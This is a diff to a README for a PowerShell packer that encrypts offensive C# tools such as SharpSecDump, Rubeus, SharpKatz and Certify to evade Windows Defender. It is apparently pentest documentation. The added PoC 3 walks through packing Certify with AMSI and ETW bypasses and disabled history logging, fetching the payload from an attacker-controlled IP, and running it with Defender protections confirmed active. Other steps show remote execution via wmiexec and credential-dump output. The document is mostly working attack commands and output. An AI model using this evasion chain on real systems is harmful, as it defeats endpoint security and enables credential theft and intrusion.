@@ -17,12 +17,6 @@ Features
   + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
   + wait for 60 seconds before execution
 
-Important note regarding AV
-----------------------------
-I tested successfully my packer script with the C# tools Rubeus, SharpKatz, SharSecDump, SharpUp and SharpChromium on a Windows server 2016
-with 2 AV solutions enabled and up-to-date (including Windows Defender). 
-However, unlike for Windows server 2016, the packed scripts are blocked on Windows 10 laptops when Windows Defender is enabled.
-
 
 =====================================================================================================================================
 PoC 1 - Run a packed/encrypted version of SharpSecDump & SharpUp on a Windows server 2016 without being detected by Windows Defender
@@ -79,7 +73,8 @@ PS C:\temp> Invoke-PoSH-CsharpPacker -FilePath C:\Users\Administrator\Documents\
 
 
 --------------------------------------------------------------------------------------------------------------------------------------
-Step 2 - Download & execute the packed/encrypted version of SharpSecDump & SharpUp without being detected by the Windows Defender AV
+Step 2 - Download & execute the packed/encrypted version of SharpSecDump & SharpUp on the target Windows 2016 server without 
+         being detected by Windows Defender
 --------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\temp> powershell -exec bypass
@@ -223,7 +218,8 @@ PS C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\PoSH-Packer
 
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
-Step 2 - Download & execute into memory the packed/encrypted version of Rubeus and SharpKatz without being detected by the Windows Defender AV
+Step 2 - Download & execute into memory the packed/encrypted version of Rubeus and SharpKatz on the target Windows 2016 server without 
+         being detected by Windows Defender
 -----------------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\Administrator\Documents\Tools-Pentest\4-Impacket_windows>wmiexec.exe administrator@192.168.56.106
@@ -376,4 +372,102 @@ C:\temp> type test2.txt
 [*]       DPAPI    : 00000000000000000000000000000000
 [*]
 [*]      WDigest
+<SNIP>
+
+
+=====================================================================================================================================
+PoC 3 - Run a packed/encrypted version of Certify on a Windows 10 laptop without being detected & blocked by Windows Defender
+=====================================================================================================================================
+
+-------------------------------------------------------------------------------------------------------------
+Step 1 - Create a packed/encrypted version of Certify using 'Invoke-PoSH-CsharpPacker.ps1'
+-------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\auditor\Documents\Tools-Pentest\1-Antivirus-bypass> . .\Invoke-PoSH-CsharpPacker.ps1
+
+   ___    _                     ___         _
+  / __|__| |_  ___ _ _ _ __ ___| _ \___  __| |_____ _ _
+ | (__(_-< ' \/ _ | '_| '_ \___|  _/ _ |/ _| / / -_) '_|
+  \___/__/_||_\__,|_| | .__/   |_| \__,_\__|_\_\___|_|
+                      |_|                               v2.1
+
+Usage:
+> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\Users\auditor\Documents\Tools-Pentest\1-Antivirus-bypass> Invoke-PoSH-CsharpPacker -FileUrl https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Certify.exe 
+-OutFile C:\Temp\packed-certify.ps1
+[*] Downloading the remote .NET executable file: 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Certify.exe'
+[*] Creating the .NET executable loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted .NET executable loader script has been saved: 'C:\Temp\packed-certify.ps1' ...
+[+] Done!
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download & execute the packed/encrypted version of Certify on the target Windows 10 laptop without being detected by Windows Defender AV
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Public\Documents> powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+C:\Users\Public\Documents> wget -URI http://192.168.56.200/packed-certify.ps1 -OutFile C:\Users\Public\Documents\packed-certify.ps1
+C:\Users\Public\Documents> ls
+
+    Directory: C:\Users\Public\Documents
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/19/2023  12:57 AM         158858 packed-certify.ps1
+
+
+C:\Users\Public\Documents> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled,IsTamperProtected | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+IsTamperProtected         : True
+
+
+C:\Users\Public\Documents>  . .\packed-certify.ps1
+True
+
+C:\Users\Public\Documents> Invoke-Packed-Net-Executable find
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=company,DC=work'
+
+[*] Listing info about the Enterprise CA 'company-DC1-CA'
+
+    Enterprise CA Name            : company-DC1-CA
+    DNS Hostname                  : DC1.company.work
+    FullName                      : DC1.company.work\company-DC1-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=company-DC1-CA, DC=company, DC=work
 <SNIP>
